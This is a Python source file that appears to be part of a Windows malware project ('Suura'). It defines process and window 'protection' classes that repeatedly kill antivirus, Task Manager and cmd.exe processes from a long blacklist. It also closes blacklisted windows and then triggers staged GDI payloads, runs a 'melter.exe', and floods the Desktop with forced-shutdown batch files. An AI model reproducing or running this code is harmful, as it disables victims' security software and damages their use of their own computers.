import os
import time
import subprocess
import signal
import psutil
import threading
from .util import GetCurrentWindowTitle
from .util import getHwnd
from .util import get_pid_from_window_hwnd
from .util import list_windows
from .msgbox import *
from .localization import strings
string = strings()
execute = os.system
drop_gdi_payload = lambda *args:None
from Suura.includes.payloads.gdi_payloads import GDI_PAYLOAD_2,GDI_PAYLOAD
class ProcessProtection:
    def __init__(self):
        self.black_list_process = [
            'taskmgr.exe', 
            'ashserv.exe', 
            'avgemc.exe', 
            'epprotectedservice.exe', 
            'epsecurityservice.exe', 
            'epupdateservice.exe', 
            'epupdateserver.exe', 
            'sfc.exe', 
            'cavwp.exe', 
            'cfp.exe', 
            'cylancesvc.exe', 
            'eraagent.exe', 
            'fsav32.exe', 
            'fsdfwd.exe', 
            'fsguiexe.exe', 
            'klnagent.exe', 
            'mbam.exe', 
            'mbar.exe', 
            'mbae.exe', 
            'mcuicnt.exe', 
            'mfemms.exe', 
            'mfevtps.exe', 
            'mcshield.exe', 
            'mfeesp.exe', 
            'mfetps.exe', 
            'mfetrs.exe', 
            'mfetp.exe', 
            'mcods.exe', 
            'mpfservice.exe', 
            'mpfagent.exe', 
            'mcshell.exe', 
            'mssclli.exe', 
            'avengine.exe', 
            'pcmaticpushcontroller.exe', 
            'pcmaticrt.exe', 
            'sepwscsvc64.exe', 
            'ntrtscan.exe', 
            'tmntsrv.exe', 
            'pccpfw.exe', 
            'wrsa.exe', 
            'mpcmdrun.exe', 
            'msascuil.exe',
            'taskmgr.exe',
            "cmd.exe"
        ] # şimdilik powershell silindi sonra yine ekle alperen
        self.terminator = os.kill
    def progressor(self):
        while 1:
            for process in psutil.process_iter():
                process_name = process.name().lower()
                process_id = process.pid
                if process_name in self.black_list_process:
                    try:
                        #subprocess.call(f"taskkill.exe /f /im {process_name}".split(" "))
                        os.kill(process_id,signal.SIGTERM)
                    except OSError:
                        pass
            time.sleep(0.1)
    def start(self):
        thread = threading.Thread(target=self.progressor)
        thread.daemon = False
        thread.start()
class WindowProtection:
    def __init__(self):
        self.blacklisted_titles = string.string_user_opened_not_allowed_wintitles
        self.stage = 0
        self.child_stage = 0
        self.stage_dropper = {
            1:{
                "handler":GDI_PAYLOAD_2(),
                "is_dropped":False
            },
            2:{
                "handler":GDI_PAYLOAD(),
                "is_dropped":False
            }
        }
    def melt_it(self):
        path = os.path.join(os.path.expanduser("~"),"melter.exe")
        try:
            subprocess.call(path)
        except:
            pass
    def dont_do_that(self):
        optional_path = os.path.join(os.path.expanduser("~"),"Desktop")
        for i in range(1,150):
            with open(optional_path+"dont_do_that_%s.bat" % (i),"w") as fd:
                fd.write("shutdown /s /f /t")
    def kill_proc(self,window_title: str):
        window_hwnd = list_windows().get(window_title)
        if not window_hwnd is None:
            pid = get_pid_from_window_hwnd(window_title,window_hwnd)
            if pid != 0:
                try:
                    os.kill(pid,signal.SIGTERM)
                    self.stage = self.stage + 1
                except Exception as kill_err:
                    return False
    def _handler(self):
        while True:
            for black_listed_window_ in self.blacklisted_titles:
                window_title = GetCurrentWindowTitle()
                if black_listed_window_ in window_title.lower():
                    self.kill_proc(window_title)
                if not self.stage_dropper.get(self.stage) is None and self.stage_dropper[self.stage]["is_dropped"] is False:
                    self.stage_dropper[self.stage]["is_dropped"] = True
                    self.stage_dropper[self.stage]["handler"].start()
    def start(self):
        thread = threading.Thread(target=self._handler,daemon=True)
        thread.start()